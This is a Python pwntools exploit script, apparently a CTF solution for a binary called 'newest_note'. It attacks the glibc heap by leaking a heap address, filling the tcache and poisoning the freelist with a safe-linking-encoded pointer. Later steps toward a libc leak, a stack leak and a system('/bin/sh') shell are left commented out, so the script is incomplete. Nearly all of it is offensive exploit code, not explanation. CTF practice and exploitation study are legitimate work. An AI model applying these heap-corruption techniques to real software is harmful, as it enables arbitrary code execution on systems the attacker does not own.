# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './newest_note'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(idx , text = 'a'):
    cmd(1)
    sla('Index:' , idx)
    sa('Content:' , text)

def show(idx ):
    cmd(3)
    sla('Index:' , idx)

def delete(idx ):
    cmd(2)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    # sla('be? :' , 0x20100000)
    sla('be? :' , 0x100)

    for i in range(0x13):
        add(i)
    
    delete(0)
    show(0)
    ru('Content: ')
    key = uu64(5)
    
    heap_addr = key << 12
    lg('heap_addr' , heap_addr)
    
    # 先填满tcache 并在 fastbin 放一个
    for i in range(7):
        delete(i+1)
    
    # 从 tcache 申请一个，此时tcache中有 6 个bins
    add(11 )
    
    # free fastbin 中的堆块
    delete(7)
    
    add(12 , p64(key^(heap_addr + 0x290)))
    
    for i in range(6):
        add(i)
    
    
    
    
    add(12)
    # dbg()
    # add(10)
    
    # dbg()
    
    
    # payload = flat(
    #     heap_addr +  0x290 + 0x10, heap_addr + 0x10, 
    # )
    
    # add(11 , payload )
    # delete(1)
    # show(1)
    
    # add(11)
    # add(heap_addr + 0x10, 12 , p64(heap_addr +  0x290 + 0x10 ))
    # show(8)
    
    # libc.address = l64() - 0x1e1061
    # system_addr = libc.sym['system']
    # _environ = libc.sym['__environ']
    # binsh_addr = libc.search('/bin/sh').next()
    # lg('_environ',_environ  )
    

    # add(13 , p64(_environ))
    # show(16)
    
    # stack_addr = l64()
    # delete(16)
    
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   newest_note.py
@Time    :   2022/05/29 14:13:25
@Author  :   Niyah 
'''